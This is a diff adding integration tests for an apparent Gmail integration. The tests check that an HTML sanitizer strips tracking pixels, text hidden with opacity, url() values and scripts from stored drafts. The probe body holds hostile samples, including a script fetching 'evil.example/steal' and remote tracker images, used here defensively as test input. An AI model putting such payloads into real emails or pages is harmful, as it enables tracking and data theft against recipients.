@@ -610,3 +610,150 @@ class TestReplyToThreadLifecycle:
             live_context,
         )
         assert archive_result.type == ResultType.ACTION
+
+
+# ============================================================
+#  HTML sanitisation (issue #434)
+#
+#  These assert on the MIME Gmail actually stored, not on our own
+#  pre-send output. No action exposes the text/html part - get_draft
+#  returns only the plain-text body - so the raw draft is read directly.
+# ============================================================
+
+
+def _stored_message(draft_id):
+    """Return the parsed MIME message Gmail stored for a draft.
+
+    Read through googleapiclient rather than an action because no action
+    surfaces the text/html part, and asserting on our own output would not
+    prove what Gmail kept.
+    """
+    import base64
+    import email as emaillib
+
+    from google.oauth2.credentials import Credentials
+    from googleapiclient.discovery import build as build_service
+
+    service = build_service("gmail", "v1", credentials=Credentials(token=os.environ.get("GMAIL_ACCESS_TOKEN", "")))
+    stored = service.users().drafts().get(userId="me", id=draft_id, format="raw").execute()
+    return emaillib.message_from_bytes(base64.urlsafe_b64decode(stored["message"]["raw"]))
+
+
+def _body_parts(message):
+    """Return the (html, plain) payloads of a parsed MIME message."""
+    html = plain = ""
+    for part in message.walk():
+        if part.get_content_type() == "text/html":
+            html = part.get_payload(decode=True).decode("utf-8", errors="replace")
+        elif part.get_content_type() == "text/plain":
+            plain = part.get_payload(decode=True).decode("utf-8", errors="replace")
+    return html, plain
+
+
+# Exercises the whole policy in one body: styling that must survive, a tracking
+# pixel, hidden text, an SVG property, a url() on an allowlisted property, and a
+# <style> block whose contents must not be printed into the email.
+SANITIZER_PROBE_BODY = """<div style="font-family:Arial,sans-serif;color:#222222">
+  <style>@keyframes pulse{0%{color:red}}.x:hover{color:green}</style>
+  <h2 style="color:#0B5FFF;text-shadow:0 1px 2px rgba(0,0,0,0.3)">Heading</h2>
+  <table style="border-collapse:collapse;box-shadow:0 2px 6px rgba(0,0,0,0.12)">
+    <tr><td style="padding:8px;border:1px solid #cccccc;background-color:#f7f9fc">cell</td></tr>
+  </table>
+  <p style="border-radius:6px;letter-spacing:0.05em">rounded</p>
+  <div style="background-image:url(http://tracker.example/open.gif)"></div>
+  <p style="opacity:0">hidden text</p>
+  <p style="fill-opacity:0">svg hidden</p>
+  <p style="background-color:url(http://tracker.example/x.gif)">url on allowed property</p>
+  <script>fetch('http://evil.example/steal')</script>
+</div>"""
+
+
+@pytest.mark.destructive
+class TestHtmlSanitizationLifecycle:
+    """LIFECYCLE: creates real drafts, reads the stored MIME back, deletes them.
+
+    What is created: 2 drafts (subjects "[AH integration test {pid}] html
+    sanitizer" and "... bcc accepted"). Cleanup: both are deleted at the end.
+    Neither is ever sent, so nothing leaves the mailbox.
+    """
+
+    @pytest.mark.asyncio
+    async def test_inline_styles_survive_and_unsafe_css_is_dropped(self, live_context):
+        subject = f"[AH integration test {os.getpid()}] html sanitizer"
+
+        create_result = await gmail.execute_action(
+            "create_draft",
+            {
+                "to": ["self-test@example.com"],
+                "subject": subject,
+                "body": SANITIZER_PROBE_BODY,
+                "body_format": "html",
+            },
+            live_context,
+        )
+        assert create_result.type == ResultType.ACTION, create_result
+        draft_id = create_result.result.data["draft"]["id"]
+        assert draft_id
+
+        try:
+            html, plain = _body_parts(_stored_message(draft_id))
+
+            # Styling the action schemas tell callers to use must survive.
+            assert "color:#0B5FFF" in html
+            assert "border-collapse" in html
+            assert "padding:8px" in html
+            assert "border:1px solid #cccccc" in html
+            assert "background-color:#f7f9fc" in html
+            assert "border-radius:6px" in html
+            assert "letter-spacing" in html
+            assert "font-family" in html
+            # Shadows are allowlisted: safe, and Outlook simply ignores them.
+            assert "box-shadow" in html
+            assert "text-shadow" in html
+
+            # Remote fetches, hidden content and scripts must not.
+            assert "tracker.example" not in html, "a url() survived, remote fetch is possible"
+            assert "background-image" not in html
+            assert "opacity" not in html, "opacity survived, text can be hidden from the reader"
+            assert "evil.example" not in html
+            assert "<script" not in html
+
+            # <style> contents must be discarded, not printed as body text.
+            assert "keyframes" not in html
+            assert ":hover" not in html
+
+            # The plain-text alternative is still generated from the sanitised HTML.
+            assert plain.strip()
+            assert "keyframes" not in plain
+        finally:
+            delete_result = await gmail.execute_action(
+                "delete_draft", {"user_id": "me", "draft_id": draft_id}, live_context
+            )
+            assert delete_result.type == ResultType.ACTION
+
+    @pytest.mark.asyncio
+    async def test_bcc_reaches_the_message(self, live_context):
+        """bcc was readable in code but undeclared, so callers could not reach it."""
+        subject = f"[AH integration test {os.getpid()}] bcc accepted"
+
+        create_result = await gmail.execute_action(
+            "create_draft",
+            {
+                "to": ["self-test@example.com"],
+                "bcc": ["bcc-self-test@example.com"],
+                "subject": subject,
+                "body": "bcc smoke test",
+            },
+            live_context,
+        )
+        assert create_result.type == ResultType.ACTION, create_result
+        draft_id = create_result.result.data["draft"]["id"]
+
+        try:
+            message = _stored_message(draft_id)
+            assert "bcc-self-test@example.com" in (message.get("bcc") or "")
+        finally:
+            delete_result = await gmail.execute_action(
+                "delete_draft", {"user_id": "me", "draft_id": draft_id}, live_context
+            )
+            assert delete_result.type == ResultType.ACTION
